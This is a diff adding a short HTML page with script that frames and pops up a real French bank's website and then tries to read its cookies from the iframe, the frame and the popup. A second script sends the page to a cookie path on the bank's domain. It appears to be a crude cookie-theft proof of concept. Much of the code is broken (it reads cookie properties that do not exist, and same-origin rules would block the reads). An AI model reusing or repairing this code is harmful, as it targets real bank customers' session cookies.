@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+</head>
+<body>
+
+<script>
+
+
+
+var url = "https://www.ca-sudrhonealpes.fr/";
+var id = 1;
+
+var Start_Safe_Func = function Init_Param22(){
+	document.location = url;
+	
+	
+
+};
+
+var Start_Safe_Task_Func = function Init_Param22(){
+	
+	alert(document.getElementById("i_1").cookie);
+	alert(window.frames[0].cookie);
+	
+};
+
+
+setTimeout("Start_Safe_Task_Func()", 16000);
+
+var dom = document.createElement('b'); 
+	document.body.appendChild(dom);
+
+
+var iframe = document.createElement('iframe'); 
+iframe.src = url; 
+iframe.id = "i_" + id; 
+iframe.sandbox = "allow-same-origin allow-scripts allow-popups";
+iframe.style.visibility = "visible"; 
+iframe.style.display = "block"; 
+iframe.style.width = "1200px"; 
+iframe.style.height = "700px"; 
+
+
+
+iframe.onload = function()
+			{ 
+				
+				setTimeout(function Ck(){
+	alert(iframe.contentWindow.document.cookie)
+}, 3000);
+			console.log('Internal webapp found: ' + this.src + "d=" + document.domain); 
+			};
+ dom.appendChild(iframe); 
+ 
+ var w = window.open(url, "WXSS", "menubar=yes,location=yes,resizable=yes,scrollbars=yes,status=yes");
+ alert("coookie=" + w.cookie);
+
+
+</script>
+<script>document.location.href="http://www.ca-sudrhonealpes.fr/\cookies?c=";alert(document.cookie);</script>
+</body>
+</html>
